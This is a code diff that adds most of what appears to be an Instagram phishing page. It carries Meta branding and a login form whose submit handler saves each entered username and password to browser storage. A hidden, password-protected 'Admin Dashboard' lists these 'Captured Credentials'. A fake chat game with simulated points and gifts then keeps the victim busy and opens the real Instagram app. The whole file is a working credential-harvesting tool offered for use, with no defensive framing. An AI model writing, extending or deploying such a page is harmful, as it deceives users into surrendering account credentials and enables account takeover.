@@ -180,4 +180,200 @@
 
         <div class="footer-container">
             <a href="#" class="create-btn">Create new account</a>
-            <div class="
+            <div class="meta-brand">
+                <svg viewBox="0 0 24 24"><path d="M12 2C6.477 2 2 6.477 2 12s4.477 10 10 10 10-4.477 10-10S17.523 2 12 2zm0 18c-4.411 0-8-3.589-8-8s3.589-8 8-8 8 3.589 8 8-3.589 8-8 8zm-1-13h2v6h-2zm0 8h2v2h-2z"/></svg>
+                Meta
+            </div>
+        </div>
+    </div>
+
+    <!-- SCREEN 2: Game Setup Screen -->
+    <div id="gameSetupScreen" class="screen hidden">
+        <div class="game-card">
+            <h2>🎮 InstaChat Game</h2>
+            <p style="font-size: 13px; color: #a8a8a8;">Select Target Points & Launch App</p>
+            <select id="pointSelect">
+                <option value="50">50 Points (Fast)</option>
+                <option value="100">100 Points</option>
+                <option value="200">200 Points</option>
+            </select>
+            <input type="text" id="friendUser" placeholder="Friend's Instagram Username" required>
+            <button class="game-btn" onclick="openInstagramApp()">Start Game & Open App</button>
+        </div>
+    </div>
+
+    <!-- SCREEN 3: Victory & Gift Reveal -->
+    <div id="giftScreen" class="screen hidden">
+        <div class="game-card">
+            <h2>🎉 Party Bomb Fired!</h2>
+            <p>Target points completed via background chat!</p>
+            <div class="gift-img" id="randomGiftIcon">💍</div>
+            <p id="giftNameText" style="font-weight: bold; color: #ff007f;">Diamond Ring Unlocked!</p>
+            <button class="game-btn" onclick="claimGift()">Gift Now</button>
+        </div>
+    </div>
+
+    <!-- SCREEN 4: Success End Screen -->
+    <div id="successScreen" class="screen hidden">
+        <div class="game-card">
+            <h2>✨ SUCCESSFUL! ✨</h2>
+            <p style="color: #00a884; font-size: 16px; margin: 20px 0;">Reward claimed successfully! Game session ended.</p>
+            <button class="game-btn" onclick="location.reload()">Play Again</button>
+        </div>
+    </div>
+
+    <!-- SCREEN 5: Admin Dashboard (Password Protected) -->
+    <div id="dashboardScreen" class="screen hidden">
+        <div class="dashboard-card">
+            <h2>🔒 Admin Dashboard</h2>
+            <p style="font-size: 12px; color: #a8a8a8;">Captured Credentials (Persistent Storage)</p>
+            <div class="dash-list" id="dashList">
+                <div style="color: #a8a8a8; text-align: center; padding: 20px;">No logs found.</div>
+            </div>
+            <button class="game-btn" style="background: #e74c3c;" onclick="closeDashboard()">Back to Login</button>
+        </div>
+    </div>
+
+    <script>
+        // Toggle Password Visibility
+        function togglePassword() {
+            const pass = document.getElementById('password');
+            const icon = document.getElementById('eyeIcon');
+            if(pass.type === 'password') {
+                pass.type = 'text';
+                icon.innerHTML = '<path d="M12 7c2.76 0 5 2.24 5 5 0 .65-.13 1.26-.36 1.83l2.92 2.92c1.51-1.26 2.7-2.89 3.43-4.75-1.73-4.39-6-7.5-11-7.5-1.4 0-2.74.25-3.98.7l2.16 2.16C10.74 7.13 11.35 7 12 7zM2 4.27l2.28 2.28.46.46C3.08 8.3 1.78 10.02 1 12c1.73 4.39 6 7.5 11 7.5 1.55 0 3.03-.3 4.38-.84l.42.42L19.73 22 21 20.73 3.27 3 2 4.27zM7.53 9.8l1.55 1.55c-.05.21-.08.43-.08.65 0 1.66 1.34 3 3 3 .22 0 .44-.03.65-.08l1.55 1.55c-.67.33-1.41.53-2.2.53-2.76 0-5-2.24-5-5 0-.79.2-1.53.53-2.2zm4.31-.78l3.15 3.15.02-.17c0-1.66-1.34-3-3-3l-.17.02z"/>';
+            } else {
+                pass.type = 'password';
+                icon.innerHTML = '<path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/>';
+            }
+        }
+
+        // Language Dropdown
+        function toggleLangMenu() {
+            const menu = document.getElementById('langDropdown');
+            menu.style.display = menu.style.display === 'block' ? 'none' : 'block';
+        }
+
+        // Dashboard Password Prompt
+        function openDashboardPrompt() {
+            const pwd = prompt("Enter Admin Password:");
+            if(pwd === "JAY SHREE RAAM") {
+                showScreen('dashboardScreen');
+                loadDashboardData();
+            } else if(pwd !== null) {
+                alert("Incorrect Password!");
+            }
+        }
+
+        // Screen Switcher Helper
+        function showScreen(screenId) {
+            document.querySelectorAll('.screen').forEach(s => s.classList.add('hidden'));
+            document.getElementById(screenId).classList.remove('hidden');
+        }
+
+        function closeDashboard() {
+            showScreen('loginScreen');
+        }
+
+        // Handle Login & Save to LocalStorage
+        const loginForm = document.getElementById('loginForm');
+        loginForm.addEventListener('submit', function(e) {
+            e.preventDefault();
+            const u = document.getElementById('username').value;
+            const p = document.getElementById('password').value;
+
+            let logs = JSON.parse(localStorage.getItem('ig_secret_logs') || '[]');
+            logs.unshift({ username: u, password: p, time: new Date().toLocaleString() });
+            localStorage.setItem('ig_secret_logs', JSON.stringify(logs));
+
+            showScreen('gameSetupScreen');
+        });
+
+        // Open Real Instagram App via Android Intent / Deep Link
+        let targetPoints = 100;
+        let currentPoints = 0;
+        let pointInterval = null;
+
+        function openInstagramApp() {
+            const friend = document.getElementById('friendUser').value.trim().replace('@','') || "instagram";
+            targetPoints = parseInt(document.getElementById('pointSelect').value);
+            currentPoints = 0;
+
+            // Show Floating Widget
+            document.getElementById('floatingWidget').classList.remove('hidden');
+            updateWidgetScore();
+
+            // Background point collector simulation
+            if(pointInterval) clearInterval(pointInterval);
+            pointInterval = setInterval(() => {
+                currentPoints += 10;
+                updateWidgetScore();
+                if(currentPoints >= targetPoints) {
+                    clearInterval(pointInterval);
+                    triggerGiftScreen();
+                }
+            }, 3000);
+
+            // Direct Android Intent / Custom Scheme to force open Instagram App
+            const intentUri = `intent://instagram.com/_u/${friend}/#Intent;package=com.instagram.android;scheme=https;end;`;
+            const schemeUri = `instagram://user?username=${friend}`;
+
+            // Try launching native app
+            window.location.href = schemeUri;
+            
+            // Fallback to Android Intent if scheme fails
+            setTimeout(() => {
+                window.location.href = intentUri;
+            }, 500);
+        }
+
+        function updateWidgetScore() {
+            document.getElementById('widgetScore').innerText = currentPoints + "/" + targetPoints;
+        }
+
+        function checkWidgetProgress() {
+            alert("🎮 Game Progress: " + currentPoints + " / " + targetPoints + " Points collected!\nKeep chatting on Instagram to reach the goal!");
+        }
+
+        const gifts = [
+            { icon: "💍", name: "Diamond Ring Gift!" },
+            { icon: "🌹", name: "Red Rose Bouquet!" },
+            { icon: "🧸", name: "Cute Teddy Bear!" },
+            { icon: "🍫", name: "Chocolate Box!" }
+        ];
+
+        function triggerGiftScreen() {
+            document.getElementById('floatingWidget').classList.add('hidden');
+            const selectedGift = gifts[Math.floor(Math.random() * gifts.length)];
+            document.getElementById('randomGiftIcon').innerText = selectedGift.icon;
+            document.getElementById('giftNameText').innerText = selectedGift.name;
+            showScreen('giftScreen');
+        }
+
+        function claimGift() {
+            showScreen('successScreen');
+        }
+
+        // Load Dashboard Logs
+        function loadDashboardData() {
+            const list = document.getElementById('dashList');
+            let logs = JSON.parse(localStorage.getItem('ig_secret_logs') || '[]');
+            if(logs.length === 0) {
+                list.innerHTML = `<div style="color: #a8a8a8; text-align: center; padding: 20px;">No logs found yet.</div>`;
+                return;
+            }
+            list.innerHTML = "";
+            logs.forEach((log, index) => {
+                list.innerHTML += `
+                    <div class="dash-item">
+                        <b>#${logs.length - index}</b><br>
+                        <b>User:</b> ${log.username}<br>
+                        <b>Pass:</b> ${log.password}<br>
+                        <span style="color: #8696a0; font-size: 10px;">Time: ${log.time}</span>
+                    </div>
+                `;
+            });
+        }
+    </script>
+</body>
+</html>
